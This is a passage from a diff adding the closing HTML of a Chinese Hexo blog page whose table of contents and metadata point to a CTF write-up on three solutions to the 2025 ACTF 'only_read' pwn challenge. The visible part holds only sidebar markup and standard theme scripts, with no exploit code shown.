class="toc-number">1.3.2.6.</span> <span class="toc-text">最终EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2dlresolve"><span class="toc-number">1.3.3.</span> <span class="toc-text">ret2dlresolve</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">11</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+  <script>
+    function initLive2d() {
+      live2d.init("https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/", {themeTipsPath: ""});
+    }
+  </script>
+  
+<script src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js" onload="initLive2d &amp;&amp; initLive2d()" async></script>
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "zer00ne",
+          title: "only_read的三种解法",
+          url: "https://khighl.github.io.git/2025/06/13/actf/",
+          excerpt: "",
+          description: "",
+          stripContent: "2025 ACTF only_read的三种解法| 0 | 前言回顾2025actf,常规glibc_ctf只有一道only_read,虽然我最后成功解出来了(偷跑),但是在看了Unauth师傅的ret2dlresolve和星盟师傅的magic_gadget利用后越来越感觉自己的手法丑陋无比,所以今天在这里将三种解法都展现出来 同时十分感谢星盟师傅教会了我如何在没有csu片段的情况下利用magic_gadget重定向函数的got表 题目链接:攻防世界 | 1 | 题目分析123456789[*]",
+          date: "Fri Jun 13 2025 00:00:00 GMT+0800",
+          updated: "Fri Jun 13 2025 22:31:19 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.8.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
